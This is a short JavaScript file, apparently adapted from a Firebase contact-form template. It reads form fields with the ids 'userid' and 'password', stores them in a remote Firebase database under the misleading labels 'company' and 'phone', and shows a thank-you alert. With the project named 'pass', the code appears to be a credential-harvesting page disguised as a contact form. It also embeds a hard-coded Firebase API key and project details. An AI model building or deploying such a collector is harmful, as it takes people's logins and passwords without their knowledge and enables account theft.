// Initialize Firebase (ADD YOUR OWN DATA)
var config = {
  apiKey: "AIzaSyD7jeI1d9NI44ZVchpiwhCaBSTdlf2TEt8",
  authDomain: "pass-1bb6f.firebaseapp.com",
  databaseURL: "https://pass-1bb6f-default-rtdb.firebaseio.com",
  projectId: "pass-1bb6f",
  storageBucket: "pass-1bb6f.appspot.com",
  messagingSenderId: "892872144194",
  appId: "1:892872144194:web:2a5316bac37cdc0a6d84db",
  measurementId: "G-Q6E3KXDBEE"
};
firebase.initializeApp(config);

// Reference messages collection
var messagesRef = firebase.database().ref('messages');

// Listen for form submit
document.getElementById('contactForm').addEventListener('submit', submitForm);

// Submit form
function submitForm(e){
  e.preventDefault();

  // Get values
  var name = getInputVal('name');
  var company = getInputVal('userid');
  var email = getInputVal('email');
  var phone = getInputVal('password');
  var message = getInputVal('message');

  // Save message
  saveMessage(name, company, email, phone, message);

  // Show alert
  document.querySelector('.alert').style.display = 'block';

  // Hide alert after 3 seconds
  setTimeout(function(){
    document.querySelector('.alert').style.display = 'none';
  },3000);

  // Clear form
  document.getElementById('contactForm').reset();
}

// Function to get get form values
function getInputVal(id){
  return document.getElementById(id).value;
}

// Save message to firebase
function saveMessage(name, company, email, phone, message){
  var newMessageRef = messagesRef.push();
  newMessageRef.set({
    name: name,
    company:company,
    email:email,
    phone:phone,
    message:message
  });
}